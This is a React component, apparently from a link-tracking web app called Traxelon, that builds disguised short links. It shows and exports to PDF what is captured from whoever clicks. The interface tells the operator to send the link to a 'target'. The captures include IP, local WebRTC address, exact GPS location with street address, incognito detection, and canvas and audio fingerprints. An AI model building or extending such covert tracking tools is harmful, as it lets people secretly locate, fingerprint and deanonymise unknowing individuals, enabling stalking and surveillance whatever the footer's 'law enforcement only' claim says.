

import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import {
    Shield, Link2, Copy, Eye, Smartphone, Globe,
    ChevronRight, Check, MapPin, ChevronDown, ChevronUp, Download
} from "lucide-react";
import { useAuth } from "../contexts/AuthContext";
import { createTrackingLink } from "../utils/linkService";
import { db } from "../firebase/config";
import { collection, query, where, onSnapshot, limit } from "firebase/firestore";
import jsPDF from "jspdf";

function toIST(dateInput) {
    if (!dateInput) return "-";
    const date = dateInput?.toMillis ? new Date(dateInput.toMillis()) : new Date(dateInput);
    return date.toLocaleString("en-IN", {
        timeZone: "Asia/Kolkata",
        day: "2-digit", month: "2-digit", year: "numeric",
        hour: "2-digit", minute: "2-digit", second: "2-digit",
    });
}

export default function LinkGenerator() {
    const { currentUser, userProfile, loading: authLoading } = useAuth();
    const location = useLocation();
    const [inputUrl, setInputUrl] = useState("");
    // const [generatedLink, setGeneratedLink] = useState(location.state || null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [copied, setCopied] = useState(null);
    const [captures, setCaptures] = useState([]);
    const [expandedCapture, setExpandedCapture] = useState(null);
    // const [currentToken, setCurrentToken] = useState(location.state?.token || null);
    const [generatedLink, setGeneratedLink] = useState(() => {
        const saved = sessionStorage.getItem("traxelon_last_link");
        return location.state || (saved ? JSON.parse(saved) : null);
    });
    const [currentToken, setCurrentToken] = useState(() => {
        const saved = sessionStorage.getItem("traxelon_last_link");
        return location.state?.token || (saved ? JSON.parse(saved).token : null);
    });

    // ── Real-time captures listener ──
    useEffect(() => {
        if (authLoading) return;
        if (!currentUser) return;
        if (!currentToken || typeof currentToken !== "string") return;

        console.log("✅ Valid token:", currentToken);

        const q = query(
            collection(db, "trackingLinks"),
            where("token", "==", currentToken),
            limit(1)
        );

        const unsub = onSnapshot(q, (snap) => {
            if (!snap.empty) {
                const linkData = snap.docs[0].data();
                const sorted = [...(linkData.captures || [])].sort(
                    (a, b) => new Date(b.capturedAt) - new Date(a.capturedAt)
                );
                setCaptures(sorted);
            }
        });

        return unsub;
    }, [currentToken, currentUser, authLoading]);

    async function handleGenerate(e) {
        e.preventDefault();
        if (!inputUrl.trim()) { setError("Please enter a URL."); return; }
        if (!currentUser) { setError("You must be logged in to generate links."); return; }
        if ((userProfile?.credits ?? 0) < 1) { setError("Insufficient credits."); return; }

        const finalUrl = inputUrl.startsWith("http://") || inputUrl.startsWith("https://")
            ? inputUrl
            : "https://" + inputUrl;

        setLoading(true);
        setError("");
        setGeneratedLink(null);
        setCaptures([]);
        setCurrentToken(null);

        try {
            const result = await createTrackingLink(currentUser.uid, "Quick Link", finalUrl);
            const linkData = {
                originalUrl: finalUrl,
                trackingUrl: result.trackingUrl,
                shortUrl: result.shortUrl || result.trackingUrl,
                token: result.token,
                createdAt: new Date().toISOString(),
            };
            setGeneratedLink(linkData);
            setCurrentToken(result.token);
            setInputUrl("");
            sessionStorage.setItem("traxelon_last_link", JSON.stringify(linkData));
        } catch (err) {
            setError(err.message || "Failed to generate link.");
        }
        setLoading(false);
    }

    function copyToClipboard(text, key) {
        navigator.clipboard.writeText(text);
        setCopied(key);
        setTimeout(() => setCopied(null), 2000);
    }

    return (
        <div className="min-h-screen bg-surface text-text-primary">
            <div className="absolute inset-0 bg-grid-pattern bg-grid opacity-20 pointer-events-none" />


            {/* ── Link Information ── */}
            {generatedLink && (
                <section className="relative pt-24 pb-10 px-4">
                    <div className="max-w-7xl mx-auto">
                        <div className="bg-surface-elevated border border-surface-border rounded-2xl overflow-hidden shadow-card">

                            <div className="border-b border-surface-border px-6 py-4 flex items-center justify-between">
                                <h2 className="font-display text-xl tracking-wider">
                                    LINK <span className="text-primary">INFORMATION</span>
                                </h2>
                                <span className="font-body text-xs text-text-muted italic">All links stay active permanently</span>
                            </div>

                            <div className="divide-y divide-surface-border">

                                <InfoRow label="Original URL">
                                    <span className="font-mono text-sm text-text-secondary break-all">{generatedLink.originalUrl}</span>
                                </InfoRow>

                                <InfoRow label="New URL">
                                    <div className="flex items-center gap-3 flex-1 min-w-0">
                                        <span className="font-mono text-sm text-primary break-all flex-1 min-w-0">{generatedLink.shortUrl}</span>
                                        <button
                                            onClick={() => copyToClipboard(generatedLink.shortUrl, "short")}
                                            className="flex items-center gap-1.5 px-3 py-1.5 bg-primary/10 border border-primary/30 text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors flex-shrink-0"
                                        >
                                            {copied === "short" ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                            {copied === "short" ? "Copied!" : "Copy"}
                                        </button>
                                    </div>
                                </InfoRow>

                                <InfoRow label="Tracking URL">
                                    <div className="flex items-center gap-3 flex-1 min-w-0">
                                        <span className="font-mono text-xs text-text-muted break-all flex-1 min-w-0">{generatedLink.trackingUrl}</span>
                                        <button
                                            onClick={() => copyToClipboard(generatedLink.trackingUrl, "tracking")}
                                            className="flex items-center gap-1.5 px-3 py-1.5 border border-surface-border text-text-secondary rounded-lg font-body text-xs hover:border-primary hover:text-primary transition-colors flex-shrink-0"
                                        >
                                            {copied === "tracking" ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                            {copied === "tracking" ? "Copied!" : "Copy"}
                                        </button>
                                    </div>
                                </InfoRow>

                                <InfoRow label="Tracking Code">
                                    <div className="flex items-center gap-3 flex-1 min-w-0">
                                        <span className="font-mono text-sm text-primary break-all flex-1 min-w-0">
                                            {generatedLink.token}
                                        </span>

                                        <button
                                            onClick={() => copyToClipboard(generatedLink.token, "token")}
                                            className="flex items-center gap-1.5 px-3 py-1.5 border border-surface-border text-text-secondary rounded-lg font-body text-xs hover:border-primary hover:text-primary transition-colors flex-shrink-0"
                                        >
                                            {copied === "token" ? (
                                                <>
                                                    <Check className="w-3 h-3" /> Copied!
                                                </>
                                            ) : (
                                                <>
                                                    <Copy className="w-3 h-3" /> Copy
                                                </>
                                            )}
                                        </button>
                                    </div>
                                </InfoRow>

                                <InfoRow label="Created">
                                    <span className="font-mono text-sm text-text-secondary">{toIST(generatedLink.createdAt)}</span>
                                </InfoRow>

                                <InfoRow label="Credits Left">
                                    <span className="font-mono text-sm text-primary">{userProfile?.credits ?? 0} credits</span>
                                </InfoRow>

                            </div>

                            <div className="px-6 py-4 bg-surface border-t border-surface-border flex flex-col sm:flex-row gap-3 items-start sm:items-center justify-between">
                                <p className="font-body text-xs text-text-muted">
                                    Share the <span className="text-primary font-semibold">New URL</span> with your target. Device data is captured the moment they click.
                                </p>
                                <a href="/dashboard" className="flex items-center gap-1.5 font-body text-xs text-primary hover:underline flex-shrink-0">
                                    View in Dashboard <ChevronRight className="w-3 h-3" />
                                </a>
                            </div>
                        </div>
                    </div>
                </section>
            )}

            {/* ── Captures Results ── */}
            {generatedLink && (
                <section className="px-4 pb-10">
                    <div className="max-w-7xl mx-auto">
                        <div className="bg-surface-elevated border border-surface-border rounded-2xl overflow-hidden shadow-card">

                            <div className="border-b border-surface-border px-6 py-4 flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                    <h2 className="font-display text-xl tracking-wider">
                                        RESULTS: <span className="text-primary">{captures.length}</span>
                                    </h2>
                                    {captures.length > 0 && (
                                        <span className="flex items-center gap-1 font-mono text-xs text-green-400">
                                            <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse inline-block" />
                                            LIVE
                                        </span>
                                    )}
                                </div>
                                <span className="font-body text-xs text-text-muted">Updates in real time</span>
                                {/* {captures.length > 0 && (
                                    <button
                                        onClick={exportToPDF}
                                        className="flex items-center gap-1.5 px-3 py-1.5 bg-primary/10 border border-primary/30 text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
                                    >
                                        <Download className="w-3 h-3" />
                                        Export PDF
                                    </button>
                                )} */}
                            </div>

                            {captures.length === 0 ? (
                                <div className="px-6 py-12 text-center">
                                    <Eye className="w-10 h-10 text-text-muted mx-auto mb-3" />
                                    <p className="font-body text-sm text-text-muted">No captures yet.</p>
                                    <p className="font-body text-xs text-text-muted mt-1">
                                        Share the link above — results appear here the moment someone clicks it.
                                    </p>
                                </div>
                            ) : (
                                <div className="divide-y divide-surface-border">
                                    {captures.map((capture, i) => (
                                        <CaptureRow
                                            key={i}
                                            capture={capture}
                                            index={i}
                                            expanded={expandedCapture === i}
                                            onToggle={() => setExpandedCapture(expandedCapture === i ? null : i)}
                                            generatedLink={generatedLink}
                                        />
                                    ))}
                                </div>
                            )}
                        </div>
                    </div>
                </section>
            )}



            {/* ── Footer ── */}
            <footer className="border-t border-surface-border py-8 px-6">
                <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
                    <div className="flex items-center gap-2">
                        <Shield className="w-5 h-5 text-primary" />
                        <span className="font-display text-lg tracking-widest text-text-primary">
                            TRAX<span className="text-primary">ELON</span>
                        </span>
                    </div>
                    <p className="font-body text-xs text-text-muted">© 2026 Traxelon. Authorized law enforcement use only.</p>
                    <div className="flex gap-6">
                        <a href="/about" className="font-body text-xs text-text-muted hover:text-primary transition-colors">About</a>
                        <a href="/contact" className="font-body text-xs text-text-muted hover:text-primary transition-colors">Contact</a>
                        <a href="/terms" className="font-body text-xs text-text-muted hover:text-primary transition-colors">Terms</a>
                    </div>
                </div>
            </footer>
        </div>
    );
}

// ── Capture row component ─────────────────────────────────────────────────────
function CaptureRow({ capture, index, expanded, onToggle, generatedLink }) {
    const hasGPS = capture.gpsLat && capture.gpsLon;

    async function exportToPDF() {
        // const { default: jsPDF } = await import("https://cdn.jsdelivr.net/npm/jspdf@2.5.1/+esm");
        const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
        const pageW = 210;
        const pageH = 297;
        const margin = 14;
        const colW = (pageW - margin * 2) / 2;
        let y = margin;

        const COLORS = {
            bg: [10, 18, 32], primary: [0, 212, 255], white: [255, 255, 255],
            muted: [120, 140, 160], sectionBg: [16, 28, 48], border: [30, 50, 80], label: [100, 130, 160],
        };

        const addPage = () => { doc.addPage(); y = margin; doc.setFillColor(...COLORS.bg); doc.rect(0, 0, pageW, pageH, "F"); };
        const checkY = (needed = 8) => { if (y + needed > pageH - margin) addPage(); };

        doc.setFillColor(...COLORS.bg);
        doc.rect(0, 0, pageW, pageH, "F");
        doc.setFillColor(...COLORS.primary);
        doc.rect(0, 0, pageW, 18, "F");
        doc.setFont("helvetica", "bold"); doc.setFontSize(13); doc.setTextColor(...COLORS.bg);
        doc.text("TRAXELON", margin, 12);
        doc.setFontSize(8); doc.setFont("helvetica", "normal");
        doc.text("CAPTURE REPORT", margin + 32, 12);
        doc.setTextColor(...COLORS.muted); doc.setFontSize(7);
        doc.text(`Generated: ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}`, pageW - margin, 12, { align: "right" });
        y = 26;

        if (generatedLink) {
            doc.setFillColor(...COLORS.sectionBg);
            doc.roundedRect(margin, y, pageW - margin * 2, 28, 2, 2, "F");
            doc.setFont("helvetica", "bold"); doc.setFontSize(7); doc.setTextColor(...COLORS.primary);
            doc.text("ORIGINAL URL", margin + 4, y + 6);
            doc.setFont("helvetica", "normal"); doc.setTextColor(...COLORS.white); doc.setFontSize(7);
            doc.text(doc.splitTextToSize(generatedLink.originalUrl || "-", pageW - margin * 2 - 8), margin + 4, y + 12);
            doc.setFont("helvetica", "bold"); doc.setFontSize(7); doc.setTextColor(...COLORS.primary);
            doc.text("TRACKING URL", margin + 4, y + 20);
            doc.setFont("helvetica", "normal"); doc.setTextColor(...COLORS.muted); doc.setFontSize(6.5);
            doc.text(generatedLink.shortUrl || generatedLink.trackingUrl || "-", margin + 4, y + 26);
            y += 34;
        }

        doc.setFont("helvetica", "bold"); doc.setFontSize(9); doc.setTextColor(...COLORS.primary);
        doc.text(`CAPTURE #${index + 1}`, margin, y + 5);
        y += 12;

        const SECTIONS = [
            {
                title: "NETWORK & IP", fields: [
                    ["IP Address", c => c.ip],
                    ["ISP", c => c.isp],
                    ["Organisation", c => c.org],
                    ["ASN", c => c.asn],
                    ["Hostname", c => c.hostname],
                    ["Timezone", c => c.timezone],
                    ["Connection Type", c => c.connectionType],
                    ["Connection Type 2", c => c.connectionType2],
                    ["Downlink", c => c.connectionDownlink ? c.connectionDownlink + " Mbps" : null],
                    ["Downlink Max", c => c.connectionDownlinkMax ? c.connectionDownlinkMax + " Mbps" : null],
                    ["RTT", c => c.connectionRtt ? c.connectionRtt + " ms" : null],
                    ["Save Data", c => c.connectionSaveData != null ? String(c.connectionSaveData) : null],
                    ["Local IP (WebRTC)", c => c.webRTCIP],
                ]
            },
            {
                title: "IP LOCATION (APPROXIMATE)", fields: [
                    ["City", c => c.city],
                    ["Region", c => c.region],
                    ["Country", c => c.country],
                    ["Country Code", c => c.countryCode],
                    ["ZIP", c => c.zip],
                    ["Coordinates", c => c.lat ? `${c.lat}, ${c.lon}` : null],
                ]
            },
            {
                title: "GPS LOCATION (EXACT)", fields: [
                    ["GPS Coords", c => c.gpsLat ? `${c.gpsLat}, ${c.gpsLon}` : null],
                    ["Accuracy", c => c.gpsAccuracy ? `${c.gpsAccuracy} metres` : null],
                    ["Address", c => c.gpsAddress],
                    ["City", c => c.gpsCity],
                    ["State", c => c.gpsState],
                    ["District", c => c.gpsDistrict],
                    ["Locality", c => c.gpsLocality],
                    ["Road", c => c.gpsRoad],
                    ["Pincode", c => c.gpsPincode],
                    ["Country", c => c.gpsCountry],
                ]
            },
            {
                title: "DEVICE & HARDWARE", fields: [
                    ["Device Type", c => c.device],
                    ["OS", c => c.os],
                    ["Browser", c => c.browser],
                    ["Browser Version", c => c.browserVersion],
                    ["Platform", c => c.platform],
                    ["CPU Cores", c => c.cpuCores],
                    ["CPU", c => c.cpu],
                    ["RAM", c => c.ram ? `${c.ram} GB` : null],
                    ["GPU", c => c.gpu],
                    ["GPU Vendor", c => c.gpuVendor],
                    ["Touch Points", c => c.maxTouchPoints],
                    ["Has Touch", c => c.hasTouch != null ? String(c.hasTouch) : null],
                ]
            },
            {
                title: "WEBGL & GPU", fields: [
                    ["WebGL Renderer", c => c.webglRenderer],
                    ["WebGL Vendor", c => c.webglVendor],
                    ["WebGL Version", c => c.webglVersion],
                    ["Shading Language", c => c.webglShadingLanguageVersion],
                    ["Extensions Count", c => c.webglExtensions],
                    ["Max Texture Size", c => c.webglMaxTextureSize],
                    ["Max Viewport W", c => c.webglMaxViewportWidth],
                    ["Max Viewport H", c => c.webglMaxViewportHeight],
                    ["Antialiasing", c => c.webglAntialiasing != null ? String(c.webglAntialiasing) : null],
                ]
            },
            {
                title: "BATTERY", fields: [
                    ["Battery Level", c => c.batteryLevel != null ? `${c.batteryLevel}%` : null],
                    ["Charging", c => c.batteryCharging != null ? (c.batteryCharging ? "Yes" : "No") : null],
                    ["Charging Time", c => c.batteryChargingTime != null ? `${c.batteryChargingTime}s` : null],
                    ["Discharging Time", c => c.batteryDischargingTime != null ? `${c.batteryDischargingTime}s` : null],
                ]
            },
            {
                title: "SCREEN & DISPLAY", fields: [
                    ["Resolution", c => c.screenWidth ? `${c.screenWidth}x${c.screenHeight}` : null],
                    ["Available", c => c.screenAvailWidth ? `${c.screenAvailWidth}x${c.screenAvailHeight}` : null],
                    ["Window", c => c.windowWidth ? `${c.windowWidth}x${c.windowHeight}` : null],
                    ["Outer", c => c.outerWidth ? `${c.outerWidth}x${c.outerHeight}` : null],
                    ["Screen X", c => c.screenX],
                    ["Screen Y", c => c.screenY],
                    ["Scroll X", c => c.scrollX],
                    ["Scroll Y", c => c.scrollY],
                    ["Color Depth", c => c.colorDepth ? `${c.colorDepth} bit` : null],
                    ["Pixel Depth", c => c.pixelDepth ? `${c.pixelDepth} bit` : null],
                    ["Pixel Ratio", c => c.pixelRatio],
                    ["Device Scale", c => c.deviceScaleFactor],
                    ["Color Gamut", c => c.colorGamut],
                    ["Orientation", c => c.screenOrientation],
                    ["Orientation Angle", c => c.screenOrientationAngle != null ? `${c.screenOrientationAngle}°` : null],
                    ["Orientation Type", c => c.screenOrientationType],
                    ["Extended Display", c => c.screenIsExtended != null ? String(c.screenIsExtended) : null],
                    ["Fullscreen", c => c.isFullscreen != null ? String(c.isFullscreen) : null],
                    ["Visibility", c => c.documentVisibility],
                ]
            },
            {
                title: "BROWSER DETAILS", fields: [
                    ["Language", c => c.language],
                    ["Languages", c => c.languages],
                    ["Platform", c => c.platform],
                    ["App Name", c => c.appName],
                    ["App Version", c => c.appVersion],
                    ["App Code Name", c => c.appCodeName],
                    ["Product", c => c.product],
                    ["Product Sub", c => c.productSub],
                    ["Vendor", c => c.vendor],
                    ["Vendor Sub", c => c.vendorSub],
                    ["Cookies", c => c.cookiesEnabled != null ? (c.cookiesEnabled ? "Enabled" : "Disabled") : null],
                    ["Do Not Track", c => c.doNotTrack],
                    ["History Length", c => c.historyLength],
                    ["Referrer", c => c.referrer],
                    ["Online", c => c.onLine != null ? String(c.onLine) : null],
                    ["PDF Viewer", c => c.pdfViewerEnabled != null ? String(c.pdfViewerEnabled) : null],
                    ["Java Enabled", c => c.javaEnabled != null ? String(c.javaEnabled) : null],
                    ["Doc Title", c => c.documentTitle],
                    ["Doc Charset", c => c.documentCharset],
                    ["Compat Mode", c => c.documentCompatMode],
                    ["Ready State", c => c.documentReadyState],
                    ["Plugins Count", c => c.pluginsCount],
                    ["MIME Types", c => c.mimeTypesCount],
                    ["Plugins", c => c.plugins],
                    ["User Agent", c => c.userAgent],
                ]
            },
            {
                title: "TIMEZONE & LOCALE", fields: [
                    ["Timezone", c => c.timezone],
                    ["Timezone Offset", c => c.timezoneOffset != null ? `${c.timezoneOffset} min` : null],
                    ["TZ Offset Min", c => c.timezoneOffsetMinutes],
                    ["Locale", c => c.locale],
                    ["Hour Cycle", c => c.hourCycle],
                    ["Calendar", c => c.calendar],
                    ["Numbering System", c => c.numberingSystem],
                ]
            },
            {
                title: "STORAGE", fields: [
                    ["Storage Quota", c => c.storageQuota != null ? `${c.storageQuota} MB` : null],
                    ["Storage Usage", c => c.storageUsage != null ? `${c.storageUsage} MB` : null],
                ]
            },
            {
                title: "MEDIA DEVICES", fields: [
                    ["Audio Inputs", c => c.audioInputCount],
                    ["Audio Outputs", c => c.audioOutputCount],
                    ["Video Inputs", c => c.videoInputCount],
                ]
            },
            {
                title: "PERMISSIONS", fields: [
                    ["Camera", c => c.permCamera],
                    ["Microphone", c => c.permMicrophone],
                    ["Notifications", c => c.permNotifications],
                    ["Geolocation", c => c.permGeolocation],
                    ["Clipboard", c => c.permClipboard],
                ]
            },
            {
                title: "PERFORMANCE", fields: [
                    ["Page Load Time", c => c.pageLoadTime != null ? `${c.pageLoadTime} ms` : null],
                    ["DOM Content Loaded", c => c.domContentLoaded != null ? `${c.domContentLoaded} ms` : null],
                    ["Time to First Byte", c => c.timeToFirstByte != null ? `${c.timeToFirstByte} ms` : null],
                    ["JS Heap Limit", c => c.deviceMemoryHeap != null ? `${c.deviceMemoryHeap} MB` : null],
                    ["Used JS Heap", c => c.usedJSHeap != null ? `${c.usedJSHeap} MB` : null],
                ]
            },
            {
                title: "PRIVACY", fields: [
                    ["Incognito", c => c.incognito != null ? (c.incognito ? "Yes" : "No") : null],
                    ["Ad Blocker", c => c.adBlockEnabled != null ? (c.adBlockEnabled ? "Yes" : "No") : null],
                ]
            },
            {
                title: "INPUT & DISPLAY", fields: [
                    ["Hover", c => c.hoverCapability],
                    ["Pointer Type", c => c.pointerType],
                    ["Pointer Coarse", c => c.pointerCoarse != null ? String(c.pointerCoarse) : null],
                    ["Pointer Fine", c => c.pointerFine != null ? String(c.pointerFine) : null],
                    ["Any Hover", c => c.anyHover != null ? String(c.anyHover) : null],
                    ["Any Pointer", c => c.anyPointer],
                    ["Display Mode", c => c.displayMode],
                    ["Prefers Dark", c => c.prefersColorScheme],
                    ["Reduced Motion", c => c.prefersReducedMotion != null ? String(c.prefersReducedMotion) : null],
                    ["High Contrast", c => c.prefersContrast],
                    ["Forced Colors", c => c.forcedColors != null ? String(c.forcedColors) : null],
                ]
            },
            {
                title: "FINGERPRINTS", fields: [
                    ["Canvas Hash", c => c.canvasHash],
                    ["Audio Fingerprint", c => c.audioFingerprint],
                    ["Font Count", c => c.fontCount],
                    ["Math Sin", c => c.mathSin],
                    ["Math Cos", c => c.mathCos],
                    ["Math Tan", c => c.mathTan],
                    ["Math Log", c => c.mathLog],
                    ["Math Sqrt", c => c.mathSqrt],
                    ["Math Asin", c => c.mathAsin],
                    ["Math Sinh", c => c.mathSinh],
                    ["Math Cosh", c => c.mathCosh],
                    ["Math Expm1", c => c.mathExpm1],
                ]
            },
            {
                title: "BROWSER FEATURES", fields: [
                    ["Service Worker", c => c.hasServiceWorker != null ? String(c.hasServiceWorker) : null],
                    ["Web Worker", c => c.hasWebWorker != null ? String(c.hasWebWorker) : null],
                    ["WebSocket", c => c.hasWebSocket != null ? String(c.hasWebSocket) : null],
                    ["IndexedDB", c => c.hasIndexedDB != null ? String(c.hasIndexedDB) : null],
                    ["WebRTC", c => c.hasWebRTC != null ? String(c.hasWebRTC) : null],
                    ["Canvas", c => c.hasCanvas != null ? String(c.hasCanvas) : null],
                    ["WebGL", c => c.hasWebGL != null ? String(c.hasWebGL) : null],
                    ["WebGL2", c => c.hasWebGL2 != null ? String(c.hasWebGL2) : null],
                    ["Bluetooth", c => c.hasBluetooth != null ? String(c.hasBluetooth) : null],
                    ["USB", c => c.hasUSB != null ? String(c.hasUSB) : null],
                    ["NFC", c => c.hasNFC != null ? String(c.hasNFC) : null],
                    ["Gamepad", c => c.hasGamepad != null ? String(c.hasGamepad) : null],
                    ["Vibration", c => c.hasVibration != null ? String(c.hasVibration) : null],
                    ["Geolocation", c => c.hasGeolocation != null ? String(c.hasGeolocation) : null],
                    ["Battery API", c => c.hasBattery != null ? String(c.hasBattery) : null],
                    ["Device Memory", c => c.hasDeviceMemory != null ? String(c.hasDeviceMemory) : null],
                    ["Hardware Concurrency", c => c.hasHardwareConcurrency != null ? String(c.hasHardwareConcurrency) : null],
                    ["Credentials", c => c.hasCredentials != null ? String(c.hasCredentials) : null],
                    ["Share", c => c.hasShare != null ? String(c.hasShare) : null],
                    ["Clipboard", c => c.hasClipboard != null ? String(c.hasClipboard) : null],
                    ["Wake Lock", c => c.hasWakeLock != null ? String(c.hasWakeLock) : null],
                    ["Speech Recog.", c => c.hasSpeechRecognition != null ? String(c.hasSpeechRecognition) : null],
                    ["Speech Synth.", c => c.hasSpeechSynthesis != null ? String(c.hasSpeechSynthesis) : null],
                    ["Payment Request", c => c.hasPaymentRequest != null ? String(c.hasPaymentRequest) : null],
                    ["Notification", c => c.hasNotification != null ? String(c.hasNotification) : null],
                    ["Push Manager", c => c.hasPushManager != null ? String(c.hasPushManager) : null],
                    ["Crypto", c => c.hasCrypto != null ? String(c.hasCrypto) : null],
                    ["Performance", c => c.hasPerformance != null ? String(c.hasPerformance) : null],
                    ["Intersection Obs.", c => c.hasIntersectionObserver != null ? String(c.hasIntersectionObserver) : null],
                    ["Resize Observer", c => c.hasResizeObserver != null ? String(c.hasResizeObserver) : null],
                    ["Mutation Observer", c => c.hasMutationObserver != null ? String(c.hasMutationObserver) : null],
                    ["RAF", c => c.hasRequestAnimationFrame != null ? String(c.hasRequestAnimationFrame) : null],
                    ["Fetch", c => c.hasFetch != null ? String(c.hasFetch) : null],
                    ["LocalStorage", c => c.hasLocalStorage != null ? String(c.hasLocalStorage) : null],
                    ["SessionStorage", c => c.hasSessionStorage != null ? String(c.hasSessionStorage) : null],
                ]
            },
            {
                title: "PAGE CONTEXT", fields: [
                    ["Page URL", c => c.pageUrl],
                    ["Hostname", c => c.pageHostname],
                    ["Protocol", c => c.pageProtocol],
                    ["Path", c => c.pagePathname],
                    ["Query", c => c.pageSearch],
                    ["Hash", c => c.pageHash],
                ]
            },
        ];

        [capture].forEach((capture, captureIndex) => {
            checkY(16);
            doc.setFillColor(...COLORS.primary);
            doc.roundedRect(margin, y, pageW - margin * 2, 10, 1.5, 1.5, "F");
            doc.setFont("helvetica", "bold"); doc.setFontSize(8); doc.setTextColor(...COLORS.bg);
            const hasGPS = capture.gpsLat && capture.gpsLon;
            doc.text(`CAPTURE #${captureIndex + 1}  ${hasGPS ? "GPS" : "IP"}  ${capture.capturedAt ? new Date(capture.capturedAt).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) : ""}`, margin + 3, y + 6.5);
            y += 14;

            SECTIONS.forEach(section => {
                const rows = section.fields.map(([label, fn]) => ({ label, value: fn(capture) })).filter(r => r.value != null && r.value !== "" && r.value !== "null");
                if (rows.length === 0) return;
                checkY(10);
                doc.setFont("helvetica", "bold"); doc.setFontSize(6.5); doc.setTextColor(...COLORS.primary);
                doc.text(section.title, margin, y);
                doc.setDrawColor(...COLORS.primary); doc.setLineWidth(0.2);
                doc.line(margin, y + 1, pageW - margin, y + 1);
                y += 5;
                let col = 0;
                rows.forEach(({ label, value }) => {
                    checkY(10);
                    const x = margin + col * colW;
                    doc.setFont("helvetica", "bold"); doc.setFontSize(5.5); doc.setTextColor(...COLORS.label);
                    doc.text(label.toUpperCase(), x, y);
                    doc.setFont("helvetica", "normal"); doc.setFontSize(6); doc.setTextColor(...COLORS.white);
                    const wrapped = doc.splitTextToSize(String(value), colW - 4);
                    doc.text(wrapped, x, y + 4);
                    if (col === 0) { col = 1; } else { col = 0; y += Math.max(wrapped.length * 4 + 6, 10); }
                });
                if (col === 1) y += 10;
                y += 3;
            });

            // if (captureIndex < captures.length - 1) {
            //     checkY(8);
            //     doc.setDrawColor(...COLORS.border); doc.setLineWidth(0.4);
            //     doc.line(margin, y, pageW - margin, y);
            //     y += 8;
            // }
        });

        doc.setFont("helvetica", "normal"); doc.setFontSize(6); doc.setTextColor(...COLORS.muted);
        doc.text("© 2026 Traxelon. Authorized law enforcement use only.", pageW / 2, pageH - 6, { align: "center" });
        doc.save(`traxelon-captures-${generatedLink?.token || "report"}-${Date.now()}.pdf`);
    }

    return (
        <div>
            <div
                className="flex items-center gap-3 px-6 py-4 hover:bg-surface cursor-pointer"
                onClick={onToggle}
            >
                <span
                    className="font-mono text-xs font-bold px-2 py-0.5 rounded-full flex-shrink-0"
                    style={{ background: "rgba(0,212,255,0.12)", color: "#00d4ff", border: "1px solid rgba(0,212,255,0.3)" }}
                >
                    #{index + 1}
                </span>

                <span className={`text-xs px-2 py-0.5 rounded-full font-mono border flex-shrink-0 ${hasGPS ? "bg-green-500/10 text-green-400 border-green-500/20" : "bg-primary/10 text-primary border-primary/20"}`}>
                    {hasGPS ? "📍 GPS" : "🌐 IP"}
                </span>

                <div className="flex-1 min-w-0 grid grid-cols-2 md:grid-cols-4 gap-2">
                    <div>
                        <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">Date / Time</div>
                        <div className="font-mono text-xs text-text-primary truncate">{toIST(capture.capturedAt)}</div>
                    </div>
                    <div>
                        <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">IP / Provider</div>
                        <div className="font-mono text-xs text-text-primary truncate">{capture.ip || "-"}</div>
                        <div className="font-body text-xs text-text-muted truncate">{capture.isp || ""}</div>
                    </div>
                    <div className="hidden md:block">
                        <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">Location</div>
                        <div className="font-mono text-xs text-text-primary truncate">
                            {hasGPS ? (capture.gpsCity || capture.city || "-") : (capture.city || "-")}
                        </div>
                        <div className="font-body text-xs text-text-muted truncate">{capture.country || ""}</div>
                    </div>
                    <div className="hidden md:block">
                        <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">Device</div>
                        <div className="font-mono text-xs text-text-primary truncate">{capture.device || "-"}</div>
                        <div className="font-body text-xs text-text-muted truncate">{capture.browser || ""} · {capture.os || ""}</div>
                    </div>
                </div>

                <div className="flex items-center gap-2 flex-shrink-0">
                    <button
                        onClick={(e) => { e.stopPropagation(); exportToPDF(); }}
                        className="flex items-center gap-1.5 px-3 py-1.5 bg-primary/10 border border-primary/30 text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
                    >
                        <Download className="w-3 h-3" />
                        Export PDF
                    </button>
                    <div className="text-text-muted">
                        {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                    </div>
                </div>
            </div>

            {expanded && (
                <div className="px-6 pb-6 bg-surface">
                    {/* <div className="flex justify-end mb-3 pt-3">
                        <button
                            onClick={(e) => { e.stopPropagation(); exportToPDF(); }}
                            className="flex items-center gap-1.5 px-3 py-1.5 bg-primary/10 border border-primary/30 text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
                        >
                            <Download className="w-3 h-3" />
                            Export Capture #{index + 1} PDF
                        </button>
                    </div> */}
                    <div
                        className="rounded-xl p-4"
                        style={{
                            background: "rgba(10, 22, 40, 0.85)",
                            border: "1.5px solid rgba(0, 212, 255, 0.25)",
                        }}
                    >
                        {/* 🌐 Network & IP */}
                        <DetailSection title="🌐 Network & IP">
                            <DataRow label="IP Address" value={capture.ip} />
                            <DataRow label="ISP" value={capture.isp} />
                            <DataRow label="Organisation" value={capture.org} />
                            <DataRow label="ASN" value={capture.asn} />
                            <DataRow label="Hostname" value={capture.hostname} />
                            <DataRow label="Timezone" value={capture.timezone} />
                            <DataRow label="Connection Type" value={capture.connectionType} />
                            <DataRow label="Connection Type 2" value={capture.connectionType2} />
                            <DataRow label="Downlink" value={capture.connectionDownlink ? capture.connectionDownlink + " Mbps" : null} />
                            <DataRow label="Downlink Max" value={capture.connectionDownlinkMax ? capture.connectionDownlinkMax + " Mbps" : null} />
                            <DataRow label="RTT" value={capture.connectionRtt ? capture.connectionRtt + " ms" : null} />
                            <DataRow label="Save Data" value={capture.connectionSaveData != null ? String(capture.connectionSaveData) : null} />
